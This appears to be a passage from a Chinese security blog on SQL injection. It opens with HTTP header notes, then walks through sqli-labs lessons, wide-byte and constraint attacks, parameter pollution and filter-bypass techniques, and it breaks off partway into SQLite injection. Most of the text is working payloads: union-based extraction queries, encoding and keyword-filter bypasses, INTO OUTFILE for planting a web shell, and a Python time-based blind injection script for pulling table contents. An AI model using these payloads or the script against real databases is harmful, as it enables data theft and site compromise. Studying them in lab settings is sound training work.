6、Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB 服务器去取） max-age：（只接受Age 值小于max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值） min-fresh：（接受其新鲜生命期大于其当前Age 跟min-fresh 值之和的缓存对象） 响应：public(可以用Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟WEB 服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存） 7、Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。 响应：close（连接已经关闭）。 keepalive（连接保持着，在等待本次连接的后续请求）。 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300 8、Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip 9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。 10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012 11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022 12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml 13、ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB 服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。 14、Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT 15、Host：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn 16、If-Match：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。 17、If-None-Match：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。 18、If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT 19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 20、If-Range：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一 起使用。 21、Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 22、Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a> 23、Pramga：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache 24、Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 25、Range：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、Referer：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：<a href="http://www.sina.com/">http://www.sina.com/</a> 27、Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix) 28、User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14 29、Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked 30、Vary: WEB 服务器用该头部的内容告诉Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么Cache 服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache 服务器用自己Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding 31、Via： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><p><strong>sqli-labs/less18</strong></p><p>从代码中看到</p><pre class="language-none"><code class="language-none">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)";</code></pre><p>将useragent 和ip 插入到数据库中，那么我们是不是可以用这个来进行注入呢？</p><p>将<code>user-agent</code> 修改为<code>'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;</code></p><h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><h3 id="一阶注射"><a href="#一阶注射" class="headerlink" title="一阶注射"></a>一阶注射</h3><h3 id="二阶注射"><a href="#二阶注射" class="headerlink" title="二阶注射"></a>二阶注射</h3><p>一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间接的对WEB 产生危害，这样的就被称为是二阶注入.</p><p><strong>sqli-labs/Less-24</strong></p><p>二次排序注入思路：</p><ol><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin 的密码。Sql 语句变为UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’ ， 也就是执行了UPDATE users SET passwd=”New_Pass” WHERE username =’admin’</li></ol><p>步骤演示： （1）初始数据库为</p><p>（2）注册admin’#账号</p><p>注意此时的数据库中出现了admin’#的用户，同时admin 的密码为123</p><p>（4）登录admin’#，并修改密码</p><p>可以看到admin 的密码已经修改为1111</p><h2 id="服务器（两层）架构"><a href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><p>服务器端有两个部分：第一部分为tomcat 为引擎的jsp 型服务器，第二部分为apache为引擎的php 服务器，真正提供web 服务的是php 服务器。工作流程为：client 访问服务器，能直接访问到tomcat 服务器，然后tomcat 服务器再向apache 服务器请求数据。数据返回路径则相反。</p><p>重点：index.php?id=1&amp;id=2，你猜猜到底是显示id=1 的数据还是显示id=2 的？</p><p>Explain：apache（php）解析最后一个参数，即显示id=2 的内容。Tomcat（jsp）解析第一个参数，即显示id=1 的内容。</p><p>以上图片为大多数服务器对于参数解析的介绍。 此处我们想一个问题：index.jsp?id=1&amp;id=2 请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。 字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。 几种常见的字符集： <code>ASCII</code>编码：单字节编码 <code>latin1</code>编码：单字节编码 <code>gbk</code>编码：使用一字节和双字节编码，<code>0x00-0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。双字节的第一字节范围是<code>0x81-0xFE</code> <code>UTF-8</code>编码：使用一至四字节编码，<code>0x00–0x7F</code>范围内是一位，和<code>ASCII</code> 保持一致。其它字符用二至四个字节变长表示。</p><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。 通常来说，一个<code>gbk</code>编码汉字，占用2个字节。一个<code>utf-8</code>编码的汉字，占用3个字节。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了<code>SET NAMES 'gbk' </code>或是<code>SET character_set_client =gbk</code>，这样配置会引发编码转换从而导致的注入漏洞。</p><pre class="language-none"><code class="language-none">$conn-&gt;query("set names 'gbk';");</code></pre><h3 id="GBK编码"><a href="#GBK编码" class="headerlink" title="GBK编码"></a>GBK编码</h3><pre class="language-none"><code class="language-none">&lt;?php    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");    if (!$conn) {        die("Connection failed: " . mysqli_connect_error());    } $    conn-&gt;query("set names 'gbk';");    $username = addslashes(@$_POST['username']);//非常安全的转义函数    $password = addslashes(@$_POST['password']);    $sql = "select * from users where username = '$username' and password='$password';";    $rs = mysqli_query($conn,$sql);    echo $sql.'&lt;br&gt;';    if($rs-&gt;fetch_row()){        echo "success";    }else{        echo "fail";} ?&gt;用户名输入：admin' or 1=1#转义后为： admin\' or 1=1#执行语句：... where username='admin\' or 1=1#'用户名输入：admin%df' or 1=1#转义后为： admin%df\' or 1=1#SET character_set_client ='gbk'后：admin運' or 1=1#执行语句：... where username='admin運' or 1=1#'</code></pre><p><code>%df</code> 吃掉<code>\ </code>具体的原因是<code>urlencode(\') </code>= <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的，第一位范围为<code>0x00-0x7F</code>时，当作一个字符。<code>%df</code>不在这个范围内，因此会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><h3 id="Latin1编码"><a href="#Latin1编码" class="headerlink" title="Latin1编码"></a>Latin1编码</h3><pre class="language-none"><code class="language-none">$mysqli = new mysqli( "localhost","root","root","cat");if($mysqli-&gt;connect_errno){    printf("failed: %s\n", Smysqli-&gt;connect_error);    exit();}$mysqli-&gt;query("set names utf8");$username= addslashes($_GET['username']);//我们在其基础上添加这么一条语句。if($username === 'admin'){    die("You can't do this");}$sqL= "SELECT * FROM `table1` WHERE username='{$username}'";if($result = $mysqli-&gt;query($sql)){    printf("select returned %d rous.\n",$resule-&gt;num_rows);    while ($row = $result-&gt;fetch_ array(MYSQLI_ASSOC))    {        var_ dump($row);          }    $resule-&gt;close();}else{    var_dump($mysqli-&gt;error);}$mysqli-&gt;close();?&gt;</code></pre><p>SQL语句会先转成<code>character_set_client</code>设置的编码。但他接下来还会继续转换。<code>character_set_client</code>客户端层转换完毕之后，数据将会交给<code>character_set_connection</code>连接层处理，最后在从<code>character_set_connection</code>转到数据表的内部操作字符集。</p><p>字符集的转换为：<code>UTF-8—&gt;UTF-8-&gt;Latin1</code></p><p>UTF-8编码是变长编码，可能有1~4个字节表示：</p><p>• 一字节时范围是<code>[00-7F]</code> • 两字节时范围是<code>[C0-DF][80-BF]</code> • 三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> • 四字节时范围是<code>[F0-F7][80-BF][80-BF</code>][80-BF] 然后根据<code>RFC 3629</code>规范，又有一些字节值是不允许出现在<code>UTF-8</code>编码中的：</p><p>所以最终，UTF-8第一字节的取值范围是：<code>00-7F</code>、<code>C2-F4</code>。</p><p>输入：<code>?username=admin%c2</code> 其中<code>%c2</code>是一个<code>Latin1</code>字符集不存在的字符。<code>%00-%7F</code>可以直接表示某个字符、<code>%C2-%F4</code>不可以直接表示某个字符而只是其他长字节编码结果的首字节。</p><p>对于不完整的长字节UTF-8编码的字符，进行字符集转换时会直接忽略，所以<code>admin%c2</code>会变成<code>admin</code></p><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><pre class="language-none"><code class="language-none">CREATE TABLE users(    username varchar(20),    password varchar(20))</code></pre><p>漏洞代码逻辑如下：</p><p>代码由登录和注册构成。</p><p>1.用<code>select * from table where username='$username'</code>检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。</p><p>2.用户名不存在，用<code>insert into table values('$username','$password')</code>把你输入的用户名密码插入数据库。</p><p><code>insert</code>和<code>select</code>语句执行不一样造成</p><p><code>INSERT</code>语句：截取前20个字符 <code>SELECT</code>语句：输入什么就是什么</p><p>当我们注册时字符串长度超过20，那么使用<code>select</code>检测时就会不存在，那么就使用<code>insert</code>插入，这时候由于长度超过20，截取前20个字符。</p><p>注册<code>admin a</code> -&gt; <code>SELECT</code>认为不存在-&gt; <code>INSERT</code>了前20位-&gt; 使用自己注册的<code>admin</code>和对应密码进行登录~</p><pre class="language-none"><code class="language-none">INSERT插入了admin+15空格，实际上是插入了admin，末尾的空格会被MySQL忽略掉</code></pre><p>这样就修改了<code>admin</code>的密码了</p><h2 id="order-by-后的injection"><a href="#order-by-后的injection" class="headerlink" title="order by 后的injection"></a>order by 后的injection</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><p>从本关开始，我们开始学习order by 相关注入的知识。本关的sql 语句为$sql = “SELECT * FROM users ORDER BY $id”;尝试?sort=1 desc 或者asc，显示结果不同，则表明可以注入。（升序or 降序排列）从上述的sql 语句中我们可以看出，我们的注入点在order by 后面的参数中，而order by不同于的我们在where 后的注入点，不能使用union 等进行注入。如何进行order by 的注入，我们先来了解一下mysql 官方select 的文档。</p><pre class="language-none"><code class="language-none">SELECT     [ALL | DISTINCT | DISTINCTROW ]       [HIGH_PRIORITY]       [STRAIGHT_JOIN]       [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]       [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]     select_expr [, select_expr ...]     [FROM table_references     [WHERE where_condition]     [GROUP BY {col_name | expr | position}       [ASC | DESC], ... [WITH ROLLUP]]     [HAVING where_condition]     [ORDER BY {col_name | expr | position}       [ASC | DESC], ...]     [LIMIT {[offset,] row_count | row_count OFFSET offset}]     [PROCEDURE procedure_name(argument_list)]     [INTO OUTFILE 'file_name' export_options       | INTO DUMPFILE 'file_name'       | INTO var_name [, var_name]]     [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><p>我们可利用order by 后的一些参数进行注入。</p><p>（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)</code></pre><p>没有报错，但是right 换成left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。此处可以直接构造?sort= 后面的一个参数。此时，我们可以有三种形式，</p><ul><li>直接添加注入语句，?sort=(select *<strong>*</strong>)</li><li>利用一些函数。例如rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。</li></ul><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)</code></pre><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(true</code></pre><ul><li>利用and，例如?sort=1 and (加sql 语句)。</li></ul><p>同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))</code></pre><p>接下来我们用rand()进行演示一下，因为上面提到rand(true)和rand(false)结果是不一样的。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。</code></pre><p>延时注入例子</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)http://127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</code></pre><p>同时也可以用?sort=1 and 后添加注入语句。</p><h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p><p>利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。</p><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)//SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 如果不支持报错注入的话，还可以基于时间注入：//SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><pre class="language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test1.txt"将查询结果导入到文件当中那这个时候我们可以考虑上传网马，利用lines terminated byInto outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16 进制转换)</code></pre><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><pre class="language-none"><code class="language-none">/**/替代空格%09 TAB 键（水平）%0a 新建一行%0c 新的一页%0d return 功能%0b TAB 键（垂直）%a0 空格() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</code></pre><p>%a0�</p><p>这个可算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤</p><h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>当在登录时使用的是如下SQL语句：</p><pre class="language-none"><code class="language-none">select user from user where user='$_POST[username]' and password='$_POST[password]';</code></pre><p>在这里单引号被过滤了，但是反斜杠<code>\</code>并没有被过滤。则单引号可以被转义</p><p>输入的用户名以反斜杠<code>\</code>结尾</p><pre class="language-none"><code class="language-none">username=admin\&amp;password=123456#将这个拼接进去，\就可以将第2个单引号转义掉select * from users where username='admin\' and password='123456#';这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\' and password=这个整体接下来构造password为or 2&gt;1#select * from users where username='admin\' and password=' or 2&gt;1#';上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注</code></pre><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><pre class="language-none"><code class="language-none">//--%20/**/#--+-- -%00;;%00;\x00</code></pre><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>利用urlencode，ascii(char)，hex，unicode等编码绕过</p><pre class="language-none"><code class="language-none">or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+一些unicode编码举例：    单引号：'%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9</code></pre><h3 id="like绕过"><a href="#like绕过" class="headerlink" title="like绕过"></a>like绕过</h3><pre class="language-none"><code class="language-none">?id=1' or 1 like 1#可以绕过对 = &gt; 等过滤</code></pre><h3 id="in绕过"><a href="#in绕过" class="headerlink" title="in绕过"></a>in绕过</h3><pre class="language-none"><code class="language-none">or '1' IN ('1234')#可以替代=</code></pre><h3 id="等价函数或变量"><a href="#等价函数或变量" class="headerlink" title="等价函数或变量"></a>等价函数或变量</h3><pre class="language-none"><code class="language-none">hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1</code></pre><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><pre class="language-none"><code class="language-none">select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</code></pre><h3 id="过滤union"><a href="#过滤union" class="headerlink" title="过滤union"></a>过滤union</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union'过滤代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'</code></pre><h3 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where'过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'</code></pre><h3 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit'过滤代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin</code></pre><h3 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by'过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select'过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1只能查询本表中的数据绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'</code></pre><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><h3 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\''过滤代码 1 &amp;&amp; substr(user,1,1) = 'a'绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</code></pre><h3 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex'过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</code></pre><h3 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h3><pre class="language-none"><code class="language-none">waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) 绕过方式 1 &amp;&amp; lpad(user(),1,1) in 'r'</code></pre><h3 id="过滤-逗号"><a href="#过滤-逗号" class="headerlink" title="过滤,逗号"></a>过滤<code>,</code>逗号</h3><pre class="language-none"><code class="language-none">//过滤了逗号怎么办？就不能多个参数了吗？SELECT SUBSTR('2018-08-17',6,5);与SELECT SUBSTR('2018-08-17' FROM 6 FOR 5);意思相同substr支持这样的语法：SUBSTRING(str FROM pos FOR len)SUBSTRING(str FROM pos)MID()后续加入了这种写法</code></pre><h2 id="常用Payload总结"><a href="#常用Payload总结" class="headerlink" title="常用Payload总结"></a>常用Payload总结</h2><pre class="language-none"><code class="language-none">//联合查询//获取当前数据库的表名1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #//获取表中的字段名1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #//查询数据1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #//如果group_concat被过滤了，而又只能返回一条数据，则用limit 0,1//布尔盲注脚本import requests as reqimport time as timport stringurl = "xxx"select = "select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())"select = "select group_concat(column_name) from information_schema.columns where binary table_name in ('xxxx') "select = "select group_concat(xxxx) from xxxxxxx"res = ""def text2hex(s):    res = ""    for i in s:        res +=hex(ord(i)).replace("0x", "")    return "0x" + resfor i in range(1,50):    for ascii in string.printable:        if ascii == '\\': #转义符号没有意义            continue        data = {            "username" : "admin",            "password" : f"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#".replace(" ", "/**/")        }        start = int(t.time())        r = req.post(url=url, data=data)        end = int(t.time()) - start        print(data)        if end &gt; 4:            res = ascii +res            print(res)            break        if ascii == string.printable[-1:]:            exit(0)</code></pre><h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-none"><code class="language-none">/**/--两种注释符 --后面不带空格 </code></pre><p>可以用于判断数据库类型</p><p><code>#</code>如果不生效的话则说明不是<code>mysql</code></p><h2 id="sqlite系统库"><a href="#sqlite系统库" class="headerlink" title="sqlite系统库"></a>sqlite系统库</h2><pre class="language-none"><code class="language-none">--先创建两个表CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL);CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL);INSERT INTO GIFT (ID,ITEM,LOG) VALUES (1, "Turkey", "Most British families liketo cook their own turkey. A large number of vegetables and fruits, such asasparagus, celery, onions and chestnuts, are stuffed into the belly of a tenpound turkey, and then coated with a variety of spices before being baked inthe oven.");INSERT INTO 